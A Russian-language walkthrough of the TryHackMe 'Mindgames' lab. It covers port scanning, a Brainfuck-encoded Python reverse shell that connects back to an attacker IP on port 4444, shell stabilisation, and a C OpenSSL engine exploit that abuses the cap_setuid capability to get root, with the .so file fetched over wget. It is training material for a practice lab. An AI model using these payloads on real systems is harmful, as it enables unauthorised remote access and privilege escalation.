# Mindgames

:white_check_mark:  [**Brainfuck**](#brainfuck)

:white_check_mark: [**Shell stabilisation**](#stable)

:white_check_mark: [**Openssl(capabilities)(privesc)**](#openssl_cap)

:white_check_mark: [**Sending files**](#files_send)
___

## Enumeration
Сканируем ip командой:
```
nmap -sC -sV mind.thm
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 24:4f:06:26:0e:d3:7c:b8:18:42:40:12:7a:9e:3b:71 (RSA)
|   256 5c:2b:3c:56:fd:60:2f:f7:28:34:47:55:d6:f8:8d:c1 (ECDSA)
|_  256 da:16:8b:14:aa:58:0e:e1:74:85:6f:af:bf:6b:8d:58 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Mindgames.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Главная страница **mind.thm**:

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Mindgames/1.png)

<a name="brainfuck"></a>

## Getting shell
Видим набор странных символов. Так выглядит **brainfuck**. Перейдем на сайт [dcode](https://www.dcode.fr/brainfuck-language) и раскодируем текст.
```
+[------->++<]>++.++.---------.+++++.++++++.+[--->+<]>+.------.++[->++<]>.-[->+++++<]>++.+++++++..+++.[->+++++<]>+.------------.---[->+++<]>.-[--->+<]>---.+++.------.--------.-[--->+<]>+.+++++++.>++++++++++.
```
```
print("Hello, World")
```

Попробуем подставить закодированный вариант кода в строку для ввода данных. Получаем ответ: **Hello, World**. Приложение обрабатывает закодированный запрос и выдает ответ. Загрузим туда обратную оболочку.

Обратная оболочка:
```
import pty
import socket,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.8.61.235",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
```

Вставим код на [сайте](https://www.splitbrain.org/services/ook) для кодирования(на нем проще скопировать код, чем на dcode). Получаем ответ, копируем его и вставляем в наше приложение.

Предварительно запустив слушатель, получаем обратную оболочку.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Mindgames/2.png)

<a name="stable"></a>

Стабилизируем оболочку командами:
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
CTRL+z
stty raw echo; fg
```

<a name="openssl_cap"></a>

## Getting root
Загрузим linpeas на машину и запустим скрипт. Он найдет нам интересные capabilities:

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Mindgames/3.png)

Найдем в интернете [эксплоит](https://chaudhary1337.github.io/p/how-to-openssl-cap_setuid-ep-privesc-exploit/)

Создадим файл с названием **openssl-exploit-engine.c** и запишем в него следующий код:
```
#include <openssl/engine.h>

static int bind(ENGINE *e, const char *id)
{
  setuid(0); setgid(0);
  system("/bin/bash");
}

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()
```

(Предварительно установим нужные пакеты командой **sudo apt-get install libssl-dev**).

Скомпилируем код командами:
```
gcc -fPIC -o openssl-exploit-engine.o -c openssl-exploit-engine.c
gcc -shared -o openssl-exploit-engine.so -lcrypto openssl-exploit-engine.o
```

Отправим наш скомпилированный файл на удаленную машину и запустим командой:
```
openssl req -engine ./openssl-exploit-engine.so
```

Получаем рут

<a name="files_send"></a>

## Extra
Чтобы отправить файл на удаленную машину переходим в директорию с нужным нам файлом. Открываем питон сервер командой:
```
python3 -m http.server 2222
```

На удаленной машине с помощью **wget** или **curl** скачиваем нужный нам файл:
```
wget http://your-ip/2222/openssl-exploit-engine.so
```

![](https:/github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Mindgames/4.png)

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Mindgames/5.png)
